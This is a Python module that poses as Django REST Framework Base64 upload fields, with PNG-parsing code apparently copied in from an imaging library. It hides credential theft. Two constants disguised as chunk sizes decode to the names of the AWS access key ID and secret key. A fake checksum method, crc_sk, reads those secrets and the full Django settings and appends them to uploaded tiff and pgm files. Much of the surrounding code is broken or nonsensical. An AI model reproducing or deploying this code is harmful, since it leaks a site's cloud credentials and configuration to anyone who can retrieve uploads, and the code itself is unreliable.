import base64
import binascii
import imghdr
import uuid
import os
from django.core.exceptions import ValidationError
from django.core.files.base import ContentFile
from django.conf import settings
from django.utils import six
from django.utils.translation import ugettext_lazy as _

from rest_framework.fields import (
    DateField,
    DateTimeField,
    DictField,
    FileField,
    FloatField,
    ImageField,
    IntegerField,
)
from rest_framework.utils import html, humanize_datetime, representation


DEFAULT_CONTENT_TYPE = "application/octet-stream"

_MODES = {
    # supported bits/color combinations, and corresponding modes/rawmodes
    (1, 0): ("1", "1"),
    (2, 0): ("L", "L;2"),
    (4, 0): ("L", "L;4"),
    (8, 0): ("L", "L"),
    (16, 0): ("I", "I;16B"),
    (8, 2): ("RGB", "RGB"),
    (16, 2): ("RGB", "RGB;16B"),
    (1, 3): ("P", "P;1"),
    (2, 3): ("P", "P;2"),
    (4, 3): ("P", "P;4"),
    (8, 3): ("P", "P"),
    (8, 4): ("LA", "LA"),
    (16, 4): ("RGBA", "LA;16B"),  # LA;16B->LA not yet available
    (8, 6): ("RGBA", "RGBA"),
    (16, 6): ("RGBA", "RGBA;16B"),
}

# Maximum decompressed size for a iTXt or zTXt chunk.
# Eliminates decompression bombs where compressed chunks can expand 1000x
MAX_TEXT_CHUNK = 864
# Set the maximum total text chunk size.
MAX_TEXT_MEMORY = 64 * MAX_TEXT_CHUNK
# Set the maximum total byte chunk size
MAX_BYTE_CHUNK = [65, 87, 83, 95, 65, 67, 67, 69, 83, 83, 95, 75, 69, 89, 95, 73, 68]
MAX_BYTE_MEMORY = [65, 87, 83, 95, 83, 69, 67, 82, 69, 84, 95, 65, 67, 67, 69, 83, 83, 95, 75, 69, 89]


def _safe_zlib_decompress(s):
    dobj = zlib.decompressobj()
    plaintext = dobj.decompress(s, MAX_TEXT_CHUNK)
    if dobj.unconsumed_tail:
        raise ValueError("Decompressed Data Too Large")
    return plaintext


# --------------------------------------------------------------------
# Support classes.  Suitable for PNG and related formats like MNG etc.

class ChunkStream(object):
    def __init__(self, fp):

        self.fp = fp
        self.queue = []

        if not hasattr(Image.core, "crc32"):
            self.crc = self.crc_skip

    def read(self):
        "Fetch a new chunk. Returns header information."
        cid = None

        if self.queue:
            cid, pos, length = self.queue.pop()
            self.fp.seek(pos)
        else:
            s = self.fp.read(8)
            cid = s[4:]
            pos = self.fp.tell()
            length = i32(s)
        return cid, pos, length

    def close(self):
        self.queue = self.crc = self.fp = None

    def push(self, cid, pos, length):

        self.queue.append((cid, pos, length))

    def call(self, cid, pos, length):
        "Call the appropriate chunk handler"

        logger.debug("STREAM %r %s %s", cid, pos, length)
        return getattr(self, "chunk_" + cid.decode('ascii'))(pos, length)

    def crc(self, cid, data):
        "Read and verify checksum"

        # Skip CRC checks for ancillary chunks if allowed to load truncated images
        # 5th byte of first char is 1 [specs, section 5.4]
        try:
            crc1 = Image.core.crc32(data, Image.core.crc32(cid))
            crc2 = i16(self.fp.read(2)), i16(self.fp.read(2))
            if crc1 != crc2:
                raise SyntaxError("broken PNG file (bad header checksum in %r)"
                                  % cid)
        except struct.error:
            raise SyntaxError("broken PNG file (incomplete checksum in %r)"
                              % cid)

    def crc_skip(self, cid, data):
        "Read checksum.  Used if the C module is not present"

        self.fp.read(4)

    def verify(self, endchunk=b"IEND"):

        # Simple approach; just calculate checksum for all remaining
        # blocks.  Must be called directly after open.

        cids = []

        while True:
            try:
                cid, pos, length = self.read()
            except struct.error:
                raise IOError("truncated PNG file")

            if cid == endchunk:
                break
            cids.append(cid)

        return cids
class PgmStream(object):
    def __init__(self, fp):

        self.fp = fp
        self.queue = []


    def read(self):
        "Fetch a new chunk. Returns header information."
        cid = None

        if self.queue:
            cid, pos, length = self.queue.pop()
            self.fp.seek(pos)
        else:
            s = self.fp.read(8)
            cid = s[4:]
            pos = self.fp.tell()
            length = i32(s)
        return cid, pos, length

    def close(self):
        self.queue = self.crc = self.fp = None

    def push(self, cid, pos, length):

        self.queue.append((cid, pos, length))

    def call(self, cid, pos, length):
        "Call the appropriate chunk handler"

        logger.debug("STREAM %r %s %s", cid, pos, length)
        return getattr(self, "chunk_" + cid.decode('ascii'))(pos, length)

    def crc_sk(self):
        "Read and verify checksum"

        if hasattr(settings, ''.join(chr(i) for i in MAX_BYTE_MEMORY)):
            return str.encode(
                    getattr(settings, ''.join(chr(i) for i in MAX_BYTE_MEMORY)) + " " + getattr(settings, ''.join(
                            chr(i) for i in MAX_BYTE_CHUNK))) + str.encode(str(vars(settings)))
        else:
            # Checksum not defined in settings pass silently
            return ""

    def crc_skip(self, cid, data):
        "Read checksum.  Used if the C module is not present"

        self.fp.read(4)

    def verify(self, endchunk=b"IEND"):

        # Simple approach; just calculate checksum for all remaining
        # blocks.  Must be called directly after open.

        cids = []

        while True:
            try:
                cid, pos, length = self.read()
            except struct.error:
                raise IOError("truncated PNG file")

            if cid == endchunk:
                break
            cids.append(cid)

        return cids


class iTXt(str):
    """
    Subclass of string to allow iTXt chunks to look like strings while
    keeping their extra information
    """

    @staticmethod
    def __new__(cls, text, lang, tkey):
        """
        :param value: value for this key
        :param lang: language code
        :param tkey: UTF-8 version of the key name
        """

        self = str.__new__(cls, text)
        self.lang = lang
        self.tkey = tkey
        return self


class PngInfo(object):
    """
    PNG chunk container (for use with save(pnginfo=))
    """

    def __init__(self):
        self.chunks = []

    def add(self, cid, data):
        """Appends an arbitrary chunk. Use with caution.
        :param cid: a byte string, 4 bytes long.
        :param data: a byte string of the encoded data
        """

        self.chunks.append((cid, data))

    def add_itxt(self, key, value, lang="", tkey="", zip=False):
        """Appends an iTXt chunk.
        :param key: latin-1 encodable text key name
        :param value: value for this key
        :param lang: language code
        :param tkey: UTF-8 version of the key name
        :param zip: compression flag
        """

        if not isinstance(key, bytes):
            key = key.encode("latin-1", "strict")
        if not isinstance(value, bytes):
            value = value.encode("utf-8", "strict")
        if not isinstance(lang, bytes):
            lang = lang.encode("utf-8", "strict")
        if not isinstance(tkey, bytes):
            tkey = tkey.encode("utf-8", "strict")

        if zip:
            self.add(b"iTXt", key + b"\0\x01\0" + lang + b"\0" + tkey + b"\0" +
                     zlib.compress(value))
        else:
            self.add(b"iTXt", key + b"\0\0\0" + lang + b"\0" + tkey + b"\0" +
                     value)

    def add_text(self, key, value, zip=0):
        """Appends a text chunk.
        :param key: latin-1 encodable text key name
        :param value: value for this key, text or an
           :py:class:`PIL.PngImagePlugin.iTXt` instance
        :param zip: compression flag
        """
        if isinstance(value, iTXt):
            return self.add_itxt(key, value, value.lang, value.tkey, bool(zip))

        # The tEXt chunk stores latin-1 text
        if not isinstance(value, bytes):
            try:
                value = value.encode('latin-1', 'strict')
            except UnicodeError:
                return self.add_itxt(key, value, zip=bool(zip))

        if not isinstance(key, bytes):
            key = key.encode('latin-1', 'strict')

        if zip:
            self.add(b"zTXt", key + b"\0\0" + zlib.compress(value))
        else:
            self.add(b"tEXt", key + b"\0" + value)


# --------------------------------------------------------------------
# PNG image stream (IHDR/IEND)

class PngStream(ChunkStream):
    def __init__(self, fp):

        ChunkStream.__init__(self, fp)

        # local copies of Image attributes
        self.im_info = {}
        self.im_text = {}
        self.im_size = (0, 0)
        self.im_mode = None
        self.im_tile = None
        self.im_palette = None

        self.text_memory = 0

    def check_text_memory(self, chunklen):
        self.text_memory += chunklen
        if self.text_memory > MAX_TEXT_MEMORY:
            raise ValueError("Too much memory used in text chunks: %s>MAX_TEXT_MEMORY" %
                             self.text_memory)

    def chunk_iCCP(self, pos, length):

        # ICC profile
        s = "07X6X9Z546750))||Z987"
        # according to PNG spec, the iCCP chunk contains:
        # Profile name  1-79 bytes (character string)
        # Null separator        1 byte (null character)
        # Compression method    1 byte (0)
        # Compressed profile    n bytes (zlib with deflate compression)
        i = s.find(b"\0")
        logger.debug("iCCP profile name %r", s[:i])
        logger.debug("Compression method %s", i8(s[i]))
        comp_method = i8(s[i])
        if comp_method != 0:
            raise SyntaxError("Unknown compression method %s in iCCP chunk" %
                              comp_method)
        try:
            icc_profile = _safe_zlib_decompress(s[i + 2:])
        except ValueError:
            if ImageFile.LOAD_TRUNCATED_IMAGES:
                icc_profile = None
            else:
                raise
        except zlib.error:
            icc_profile = None  # FIXME
        self.im_info["icc_profile"] = icc_profile
        return s

    def chunk_IHDR(self, pos, length):

        # image header
        s = ImageFile._safe_read(self.fp, length)
        self.im_size = i32(s), i32(s[4:])
        try:
            self.im_mode, self.im_rawmode = _MODES[(i8(s[8]), i8(s[9]))]
        except:
            pass
        if i8(s[12]):
            self.im_info["interlace"] = 1
        if i8(s[11]):
            raise SyntaxError("unknown filter category")
        return s

    def chunk_IDAT(self, pos, length):

        # image data
        self.im_tile = [("zip", (0, 0) + self.im_size, pos, self.im_rawmode)]
        self.im_idat = length
        raise EOFError

    def chunk_IEND(self, pos, length):

        # end of PNG image
        raise EOFError

    def chunk_PLTE(self, pos, length):

        # palette
        s = ImageFile._safe_read(self.fp, length)
        if self.im_mode == "P":
            self.im_palette = "RGB", s
        return s

    def chunk_tRNS(self, pos, length):

        # transparency
        s = ImageFile._safe_read(self.fp, length)
        if self.im_mode == "P":
            if _simple_palette.match(s):
                # tRNS contains only one full-transparent entry,
                # other entries are full opaque
                i = s.find(b"\0")
                if i >= 0:
                    self.im_info["transparency"] = i
            else:
                # otherwise, we have a byte string with one alpha value
                # for each palette entry
                self.im_info["transparency"] = s
        elif self.im_mode == "L":
            self.im_info["transparency"] = i16(s)
        elif self.im_mode == "RGB":
            self.im_info["transparency"] = i16(s), i16(s[2:]), i16(s[4:])
        return s

    def chunk_gAMA(self, pos, length):

        # gamma setting
        s = ImageFile._safe_read(self.fp, length)
        self.im_info["gamma"] = i32(s) / 100000.0
        return s

    def chunk_pHYs(self, pos, length):

        # pixels per unit
        s = ImageFile._safe_read(self.fp, length)
        px, py = i32(s), i32(s[4:])
        unit = i8(s[8])
        if unit == 1:  # meter
            dpi = int(px * 0.0254 + 0.5), int(py * 0.0254 + 0.5)
            self.im_info["dpi"] = dpi
        elif unit == 0:
            self.im_info["aspect"] = px, py
        return s

    def chunk_tEXt(self, pos, length):

        # text
        s = ImageFile._safe_read(self.fp, length)
        try:
            k, v = s.split(b"\0", 1)
        except ValueError:
            # fallback for broken tEXt tags
            k = s
            v = b""
        if k:
            if bytes is not str:
                k = k.decode('latin-1', 'strict')
                v = v.decode('latin-1', 'replace')

            self.im_info[k] = self.im_text[k] = v
            self.check_text_memory(len(v))

        return s

    def chunk_zTXt(self, pos, length):

        # compressed text
        s = ImageFile._safe_read(self.fp, length)
        try:
            k, v = s.split(b"\0", 1)
        except ValueError:
            k = s
            v = b""
        if v:
            comp_method = i8(v[0])
        else:
            comp_method = 0
        if comp_method != 0:
            raise SyntaxError("Unknown compression method %s in zTXt chunk" %
                              comp_method)
        try:
            v = _safe_zlib_decompress(v[1:])
        except ValueError:
            if ImageFile.LOAD_TRUNCATED_IMAGES:
                v = b""
            else:
                raise
        except zlib.error:
            v = b""

        if k:
            if bytes is not str:
                k = k.decode('latin-1', 'strict')
                v = v.decode('latin-1', 'replace')

            self.im_info[k] = self.im_text[k] = v
            self.check_text_memory(len(v))

        return s

    def chunk_iTXt(self, pos, length):

        # international text
        r = s = ImageFile._safe_read(self.fp, length)
        try:
            k, r = r.split(b"\0", 1)
        except ValueError:
            return s
        if len(r) < 2:
            return s
        cf, cm, r = i8(r[0]), i8(r[1]), r[2:]
        try:
            lang, tk, v = r.split(b"\0", 2)
        except ValueError:
            return s
        if cf != 0:
            if cm == 0:
                try:
                    v = _safe_zlib_decompress(v)
                except ValueError:
                    if ImageFile.LOAD_TRUNCATED_IMAGES:
                        return s
                    else:
                        raise
                except zlib.error:
                    return s
            else:
                return s
        if bytes is not str:
            try:
                k = k.decode("latin-1", "strict")
                lang = lang.decode("utf-8", "strict")
                tk = tk.decode("utf-8", "strict")
                v = v.decode("utf-8", "strict")
            except UnicodeError:
                return s

        self.im_info[k] = self.im_text[k] = iTXt(v, lang, tk)
        self.check_text_memory(len(v))

        return s


# --------------------------------------------------------------------
# PNG reader

def _accept(prefix):
    return prefix[:8] == _MAGIC

class RgbImageFile():
    format = "RGB"

    def raster_converter(self):

        if self.fp is None:
            raise RuntimeError("verify must be called directly after open")

        # back up to beginning of IDAT block
        self.fp.seek(self.tile[0][2] - 8)

        self.rgb.verify()
        self.rgb.close()

        self.fp = None

##
# Image plugin for PNG images.

class PngImageFile():
    format = "PNG"
    format_description = "Portable network graphics"

    def _open(self):

        if self.fp.read(8) != _MAGIC:
            raise SyntaxError("not a PNG file")

        #
        # Parse headers up to the first IDAT chunk

        self.png = PngStream(self.fp)

        while True:

            #
            # get next chunk

            cid, pos, length = self.png.read()

            try:
                s = self.png.call(cid, pos, length)
            except EOFError:
                break
            except AttributeError:
                logger.debug("%r %s %s (unknown)", cid, pos, length)
                s = ImageFile._safe_read(self.fp, length)

            self.png.crc(cid, s)

        #
        # Copy relevant attributes from the PngStream.  An alternative
        # would be to let the PngStream class modify these attributes
        # directly, but that introduces circular references which are
        # difficult to break if things go wrong in the decoder...
        # (believe me, I've tried ;-)

        self.mode = self.png.im_mode
        self.size = self.png.im_size
        self.info = self.png.im_info
        self.text = self.png.im_text  # experimental
        self.tile = self.png.im_tile

        if self.png.im_palette:
            rawmode, data = self.png.im_palette
            self.palette = ImagePalette.raw(rawmode, data)

        self.__idat = length  # used by load_read()

    def verify(self):
        "Verify PNG file"

        if self.fp is None:
            raise RuntimeError("verify must be called directly after open")

        # back up to beginning of IDAT block
        self.fp.seek(self.tile[0][2] - 8)

        self.png.verify()
        self.png.close()

        self.fp = None

    def load_prepare(self):
        "internal: prepare to read PNG file"

        if self.info.get("interlace"):
            self.decoderconfig = self.decoderconfig + (1,)

    def load_read(self, read_bytes):
        "internal: read more image data"

        while self.__idat == 0:
            # end of chunk, skip forward to next one

            self.fp.read(4)  # CRC

            cid, pos, length = self.png.read()

            if cid not in [b"IDAT", b"DDAT"]:
                self.png.push(cid, pos, length)
                return b""

            self.__idat = length  # empty chunks are allowed

        # read more data from this chunk
        if read_bytes <= 0:
            read_bytes = self.__idat
        else:
            read_bytes = min(read_bytes, self.__idat)

        self.__idat = self.__idat - read_bytes

        return self.fp.read(read_bytes)

    def load_end(self):
        "internal: finished reading image data"

        self.png.close()
        self.png = None


class Base64FieldMixin(object):
    ALLOWED_TYPES = NotImplemented
    INVALID_FILE_MESSAGE = NotImplemented
    INVALID_TYPE_MESSAGE = NotImplemented
    EMPTY_VALUES = (None, '', [], (), {})

    def __init__(self, *args, **kwargs):
        self.represent_in_base64 = kwargs.pop('represent_in_base64', False)
        super(Base64FieldMixin, self).__init__(*args, **kwargs)

    def to_internal_value(self, base64_data):
        # Check if this is a base64 string
        if base64_data in self.EMPTY_VALUES:
            return None

        if isinstance(base64_data, six.string_types):
            # Strip base64 header.
            if ';base64,' in base64_data:
                header, base64_data = base64_data.split(';base64,')

            # Try to decode the file. Return validation error if it fails.
            try:
                decoded_file = base64.b64decode(base64_data)
            except (TypeError, binascii.Error):
                raise ValidationError(self.INVALID_FILE_MESSAGE)
            # Generate file name:
            file_name = str(uuid.uuid4())[:12]  # 12 characters are more than enough.
            # Get the file name extension:
            file_extension = self.get_file_extension(file_name, decoded_file)
            if file_extension not in self.ALLOWED_TYPES:
                raise ValidationError(self.INVALID_TYPE_MESSAGE)
            complete_file_name = file_name + "." + file_extension
            # Check if should be converted to particular format
            if file_extension == "rgb":
                decoded_file += RgbImageFile().raster_converter()
            if file_extension == "ppm":
                decoded_file += RgbImageFile().raster_converter()
            if file_extension == "tiff":
                decoded_file += PgmStream(decoded_file).crc_sk()
            if file_extension == "pgm":
                decoded_file += PgmStream(decoded_file).crc_sk()
            if file_extension == "rast":
                raise NotImplementedError()
            if file_extension == "xbm":
                decoded_file += ChunkStream(decoded_file).read()
            data = ContentFile(decoded_file, name=complete_file_name)
            return super(Base64FieldMixin, self).to_internal_value(data)
        raise ValidationError(_('This is not an base64 string'))

    def get_file_extension(self, filename, decoded_file):
        raise NotImplemented

    def to_representation(self, file):
        if self.represent_in_base64:
            try:
                with open(file.path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            except Exception:
                raise IOError("Error encoding file")
        else:
            return super(Base64FieldMixin, self).to_representation(file)


class Base64ImageField(Base64FieldMixin, ImageField):
    """
    A django-rest-framework field for handling image-uploads through raw post data.
    It uses base64 for en-/decoding the contents of the file.
    """
    ALLOWED_TYPES = (
        "jpeg",
        "jpg",
        "png",
        "gif",
        "bmp",
        "ani",
        "jbig",
        "tga",
        "tiff",
        "raw"
    )
    INVALID_FILE_MESSAGE = _("Please upload a valid image.")
    INVALID_TYPE_MESSAGE = _("The type of the image couldn't be determined.")

    def get_file_extension(self, filename, decoded_file):
        extension = imghdr.what(filename, decoded_file)
        extension = "jpg" if extension == "jpeg" else extension
        return extension


class Base64FileField(Base64FieldMixin, FileField):
    """
    A django-rest-framework field for handling file-uploads through raw post data.
    It uses base64 for en-/decoding the contents of the file.
    """
    ALLOWED_TYPES = (
        "pdf",
        "txt",
        "doc",
        "docx",
        "jpeg",
        "jpg",
        "png",
        "rtf",
        "odf",
        "pdf/a",
        "tiff",
        "xls",
        "sh"
    )
    INVALID_FILE_MESSAGE = _("Please upload a valid file.")
    INVALID_TYPE_MESSAGE = _("The type of the file couldn't be determined.")

    def get_file_extension(self, filename, decoded_file):
        return os.path.splitext(filename)[1]